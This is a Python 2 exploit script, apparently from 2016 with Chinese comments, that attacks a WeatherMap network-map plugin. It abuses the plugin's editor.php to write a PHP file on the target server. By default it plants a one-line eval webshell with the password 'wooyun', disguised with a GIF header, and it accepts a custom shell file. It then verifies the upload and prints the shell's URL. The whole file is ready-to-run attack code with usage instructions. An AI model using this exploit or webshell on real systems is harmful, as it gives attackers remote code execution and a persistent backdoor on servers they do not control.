#!/usr/bin/env python
# -*- coding:utf-8 -*-
# WeaTherMap getshell
# 当前版本:WeaTherMap插件
# 时间：2016年6月24日
# 来源:http://zone.wooyun.org/content/28036

import requests
import argparse
import time
import traceback

banner = u'''\
# WeaTherMap getshell
# 当前版本:WeaTherMap插件
# 时间：2016年6月24日
# 来源:http://zone.wooyun.org/content/28036
#使用说明：只适合上一句话shell
#测试地址：
# 1、默认写入一句话: 密码：wooyun
    python exp.py -u http://xxx.xxx.xxx.xxx/index.php
# 2、上传指定的一句话shell：
    python exp.py -u http://xxx.xxx.xxx.xxx/index.php -f /root/Desktop/myshell.php
'''
def getshell(url, file):
    # Gif89a <?php @eval($_POST['wooyun']);?>
    print banner
    shell_text = "Gif89a <?php @eval($_POST['wooyun']);?>"
    try:
        try:
            if not (file is None):
                shellfile=open(file, 'rb')
                shell_text = shellfile.read()
                shellfile.close()
        except Exception,e:
            print "File Not Found."
            return
        temp_url = "{target_url}/plugins/weathermap/editor.php?plug=0&mapname={shell_name}&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php echo md5(666);?>{shell_content}&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=NameH"
        timetemp = time.time()
        tmp_file_name = str(int(timetemp))+".php"
        print "[checking] " + url
        s = requests.session()
        res = s.get(temp_url.format(target_url=url, shell_name=tmp_file_name, shell_content=shell_text))
        if res.status_code == 200:
            check_shell = url+"/plugins/weathermap/configs/{shell_name}".format(shell_name=tmp_file_name)
            flag = check_my_shell(check_shell)
            if flag:
                print "[getshell success]"
                print "SHELL: " + check_shell
                exit(0)
        print u"getshell failed..."
    except Exception, e:
        print u"getshell failed..."

# 检查shell写入成功没有
def check_my_shell(shell_url):
    # md5(666) = fae0b27c451c728867a567e8c1bb4e53
    s = requests.session()
    res = s.get(shell_url)
    if "fae0b27c451c728867a567e8c1bb4e53" in res.content:
        return True
    else:
        return False

parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
parser.add_argument('-f', help='upload your webshell .')
args = parser.parse_args()
args_dict = args.__dict__

try:
    shellpath = None
    if not (args_dict['u'] == None):
        url = args_dict['u']
    if not (args_dict['f'] == None):
        shellpath = args_dict['f']
    getshell(url, shellpath)
except Exception,e:
    print parser.print_usage()
    exit(-1)
